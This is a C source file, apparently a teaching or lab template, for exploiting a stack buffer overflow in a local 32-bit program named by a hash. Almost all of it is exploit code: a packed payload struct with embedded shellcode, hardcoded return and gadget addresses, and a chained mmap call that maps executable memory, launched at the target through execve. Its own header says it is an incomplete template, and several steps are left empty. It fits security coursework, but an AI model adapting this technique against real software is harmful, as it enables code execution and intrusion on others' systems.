/*
 * This template demonstrates how an exploit for a stack based
 * buffer overflow could be structured. Feel free to use it, or
 * write your own from scratch.
 *
 * The code does NOT match c4288bb0f38c68dd2258b0b941ccbb4534e286d5;
 * it is just a template and you need to change most of it.
 */

#include <inttypes.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

unsigned char shellcode[] = {
#include "stack-shellcode.h"
};

#define MMAP 	0x8048a30;
#define STRCPY 	0x80489f0;
#define POP6 	0x804dbd5;
#define START	0x8050d65;
#define NULL_P	0x8050d55;

int main(void)
{

	/* This is a stack frame of a function which takes two arguments */
	struct two_arg {
        unsigned int func;
        unsigned int leave_ret;
        unsigned int param1;
        unsigned int param2;
	};

	struct mmap_args{
		uint32_t addr; /* Address of mmap call */
		uint32_t pop6; /* pop6-gadget */
		uint32_t buf; /* Buffer */
		uint32_t length; /* Length */
		uint32_t prot; /* PROT */
		uint32_t flags; /* MAP */
		uint32_t fd; /* Filedescriptor */
		uint32_t offset; /* Offset */
	};

	/* Struct used for skipping ahead in buffer */
	struct skipper{
		uint32_t ret;
		char fill1[204];
	};

	struct _overflow {
		/* Overflow filename with shellcode */
		char filename[4];
		char dot;
		char shellcode[50];
		uint32_t ret;		

		/* Skip into 0x0 area */
		struct skipper skip1;
		struct skipper skip2;
		
		/* Call strcpy twice to nullify */


		/* Call mmap */
		struct mmap_args mmap;

		/* Call strcpy again */


		uint32_t ret1;
		unsigned char nul;  /* terminate string */
	} __attribute__((packed)) overflow;

	memset(&overflow, 'A', sizeof(overflow));
	overflow.dot = '.';
	memcpy(overflow.shellcode,shellcode,sizeof(shellcode));

	overflow.ret = START;

	overflow.skip1.ret = 0x804cd3d;
	overflow.skip2.ret = 0x804cd3d;

	overflow.mmap.addr = MMAP;
	overflow.mmap.pop6 = POP6;
	overflow.mmap.buf = 0xaa011001;
	overflow.mmap.length = 0x01020304;
	overflow.mmap.prot = 0x01010100 | PROT_EXEC | PROT_READ | PROT_WRITE;
	overflow.mmap.flags = 0x01010200 | MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS;
	overflow.mmap.fd = 0xffffffff;
	overflow.mmap.offset = 0x01021001;

	overflow.ret1 = 0x46464646;

	overflow.nul = '\0';
	char *argv[] = { 	"./c4288bb0f38c68dd2258b0b941ccbb4534e286d5",
						"-read",
						(char*)&overflow,
						NULL };

	execve(argv[0], argv, NULL);

	return EXIT_FAILURE;
}
